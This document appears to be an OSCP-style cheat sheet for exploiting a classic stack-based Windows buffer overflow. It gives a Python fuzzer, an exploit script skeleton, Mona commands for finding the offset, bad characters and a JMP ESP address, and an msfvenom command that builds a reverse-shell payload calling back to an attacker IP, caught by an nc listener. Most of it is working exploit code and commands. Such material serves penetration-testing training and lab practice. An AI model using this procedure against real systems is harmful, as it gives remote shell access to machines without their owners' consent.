# Buffer Overflow (OSCP-style) Cheat Sheet

Step-by-step process for a classic stack-based Windows buffer overflow using
Immunity Debugger + Mona. This is a methodical checklist more than a single
command — each step depends on the output of the last.

## 0. Setup

Attach the vulnerable binary in Immunity Debugger (it starts paused — hit
Run). Confirm it's listening:

```bash
nc <TARGET_IP> <PORT>
```

```
!mona config -set workingfolder c:\mona\%p
```

## 1. Fuzzing — find the crash

Send an increasing buffer until the service crashes, to get a rough offset:

```python
import socket, time, sys

ip = "<TARGET_IP>"
port = <PORT>
prefix = "OVERFLOW1 "
string = prefix + "A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((ip, port))
            s.recv(1024)
            print(f"Fuzzing with {len(string) - len(prefix)} bytes")
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except:
        print(f"Crashed at {len(string) - len(prefix)} bytes")
        sys.exit(0)
    string += 100 * "A"
    time.sleep(1)
```

## 2. Crash replication & controlling EIP

```python
import socket
ip = "<TARGET_IP>"
port = <PORT>
prefix = "OVERFLOW1 "
offset = 0            # filled in after the pattern step below
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(bytes(buffer + "\r\n", "latin-1"))
```

Generate a cyclic pattern and use it as the payload to find the exact offset
that lands in EIP:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <bytes>
```

In Immunity, after the crash:

```
!mona findmsp -distance <bytes>
```

Look for `EIP contains normal pattern : ... (offset XXXX)` — that's the
offset. Set it in the script, set `payload = ""`, set `retn = "BBBB"`, and
confirm EIP shows `42424242` on the next crash.

## 3. Finding bad characters

```
!mona bytearray -b "\x00"
```

```python
for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')
```

Set the payload to this bad-char string, send it, then compare memory
against the generated bytearray:

```
!mona compare -f C:\mona\<process>\bytearray.bin -a <ESP_ADDRESS>
```

Remove any bytes mona flags as modified/missing (in addition to `\x00`,
which is always excluded), regenerate the bytearray with the new exclusion
list, and repeat until the comparison returns "Unmodified".

## 4. Finding a jump point

```
!mona jmp -r esp -cpb "\x00<other-bad-chars>"
```

Pick an address from the results (ideally from a module without ASLR/DEP
protections). Set `retn` to that address **written backwards** (little
endian) — e.g. address `\x01\x02\x03\x04` becomes `\x04\x03\x02\x01` in the
script.

## 5. Generating the final payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> EXITFUNC=thread -b "\x00<other-bad-chars>" -f c
```

Paste the generated bytes into the `payload` variable, and prepend NOP sled
padding (the encoder needs a little room to unpack):

```python
padding = "\x90" * 16
```

## 6. Exploit

```bash
nc -nvlp <PORT>          # attacker listener, matching the LPORT used above
```

Restart the target binary in Immunity, run the final exploit script — the
listener should catch a reverse shell.
